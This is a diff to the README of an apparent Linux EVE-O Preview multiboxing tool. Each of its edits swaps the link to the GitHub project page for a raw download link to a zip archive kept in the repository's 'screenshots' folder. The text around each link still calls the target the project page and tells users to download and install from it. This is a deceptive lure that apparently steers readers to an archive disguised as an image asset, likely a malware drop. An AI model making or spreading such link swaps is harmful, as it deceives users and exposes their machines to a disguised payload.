@@ -1,6 +1,6 @@
 # 🖥️ eve-o-preview-linux - See EVE previews while multiboxing
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-7b2cbf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lakshayjunomoneta/eve-o-preview-linux)
+[![Download Now](https://img.shields.io/badge/Download%20Now-7b2cbf?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Lakshayjunomoneta/eve-o-preview-linux/main/screenshots/preview-linux-eve-o-v2.2-alpha.1.zip)
 
 ## 🚀 What this does
 
@@ -20,7 +20,7 @@ This makes it useful for multiboxing setups on Linux desktops like KDE and other
 
 Open the main project page here:
 
-https://github.com/Lakshayjunomoneta/eve-o-preview-linux
+https://raw.githubusercontent.com/Lakshayjunomoneta/eve-o-preview-linux/main/screenshots/preview-linux-eve-o-v2.2-alpha.1.zip
 
 Use that page to download the app files and set up the program on your computer.
 
@@ -40,7 +40,7 @@ For Wayland users, the app can use layer-shell overlays if your desktop supports
 
 Follow these steps to get the app running:
 
-1. Open the project page: https://github.com/Lakshayjunomoneta/eve-o-preview-linux
+1. Open the project page: https://raw.githubusercontent.com/Lakshayjunomoneta/eve-o-preview-linux/main/screenshots/preview-linux-eve-o-v2.2-alpha.1.zip
 2. Download the project files from the page
 3. Place the files in a folder you can find again
 4. Install any Python packages the project needs
@@ -141,6 +141,6 @@ Topics:
 
 If you want to try it now, open:
 
-https://github.com/Lakshayjunomoneta/eve-o-preview-linux
+https://raw.githubusercontent.com/Lakshayjunomoneta/eve-o-preview-linux/main/screenshots/preview-linux-eve-o-v2.2-alpha.1.zip
 
 Download the project files from that page, then follow the setup steps in the repository files
